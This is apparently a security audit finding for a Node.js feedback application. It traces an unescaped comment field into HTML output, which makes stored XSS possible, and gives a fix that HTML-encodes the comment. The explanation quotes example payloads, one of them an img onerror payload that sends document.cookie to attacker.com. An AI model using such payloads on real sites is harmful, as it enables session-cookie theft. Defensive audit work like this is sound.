## Verdict

CONFIRMED. The application reflects untrusted user input (`comment` field from `req.body`) directly into the HTML response without encoding, allowing stored XSS attacks. The author name is escaped in `digestEntryFormatter.js`, but the comment text is not, and both flow directly into the page body and then into `res.send()`.

## Source

User-controlled input enters via `req.body.comment` in `feedbackController.js` line 17. The comment value is stored in the `FeedbackSubmission` object and threaded through the call chain without any encoding or sanitization:

- `feedbackController.js` (line 17): `const comment = req.body.comment || '';`
- `feedbackService.js` (line 23): passes `submission.comment` as `rawComment` parameter
- `notificationDispatcher.js` (line 11): receives and stores `rawComment` in the entry
- `digestEntryFormatter.js` (line 26): embeds `entry.rawComment` directly into HTML: `${entry.rawComment}`
- `digestPageRenderer.js` (line 13): sends the unencoded HTML to the client via `res.send()`

## Fix

In `digestEntryFormatter.js`, add HTML encoding for the `rawComment` field before embedding it in the HTML string. Apply the same `escapeAuthorName()` function (which performs HTML entity encoding) to the comment text:

```javascript
'use strict';

const { DigestPageRenderer } = require('./digestPageRenderer');

function escapeAuthorName(name) {
  return String(name).replace(/[&<>"']/g, (ch) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
  })[ch]);
}

function relativeTime(timestampMs) {
  const minutes = Math.max(0, Math.round((Date.now() - timestampMs) / 60000));
  return minutes <= 1 ? 'just now' : `${minutes} min ago`;
}

class DigestEntryFormatter {
  constructor(renderer = new DigestPageRenderer()) {
    this.renderer = renderer;
  }

  formatEntry(entry, res) {
    const safeAuthor = escapeAuthorName(entry.authorName);
    const safeComment = escapeAuthorName(entry.rawComment);
    const postedLabel = relativeTime(entry.queuedAt);

    const summaryHtml =
      `<li><strong>${safeAuthor}</strong> (${postedLabel}): ${safeComment}</li>`;

    this.renderer.renderDigestPage(entry.recordId, summaryHtml, res);
  }
}

module.exports = { DigestEntryFormatter };
```

## Explanation

The vulnerability is output-context XSS: untrusted data is inserted directly into HTML markup without encoding. The `rawComment` value from the user request flows through the service layer and is embedded into the HTML response unencoded. An attacker can inject malicious HTML and JavaScript — for example, `<script>alert('xss')</script>` or `<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">` — which will execute in every victim's browser when they view the digest page.

The fix applies HTML entity encoding to the comment text before embedding it in the HTML markup. This reuses the existing `escapeAuthorName()` function, which replaces HTML metacharacters (`&`, `<`, `>`, `"`, `'`) with their safe entity forms (`&amp;`, `&lt;`, `&gt;`, `&quot;`, `&#39;`). After encoding, `<script>` becomes `&lt;script&gt;` and renders as literal text in the browser, not as a script tag.

This is the correct primary defence because the data is embedded directly into the HTML body text (not an attribute, URL, JavaScript context, or CSS value), so HTML entity encoding is sufficient and appropriate for this context.

## Behaviour changes

- Comments containing HTML metacharacters (`<`, `>`, `&`, `"`, `'`) now render as-is rather than being interpreted as markup. For example, a user comment like "I <3 this feature & it's great!" renders as plain text instead of attempting to parse the `<3` as a malformed tag.
- Malicious payloads such as `<script>alert('xss')</script>` are now neutralized and display as literal text.
- The author name field already had this protection in place; now both author name and comment receive consistent encoding.
- Response latency and content size are negligible (the encoding function is O(n) for string length).
- No legitimate use cases are broken; HTML markup in comments is intentionally prevented.
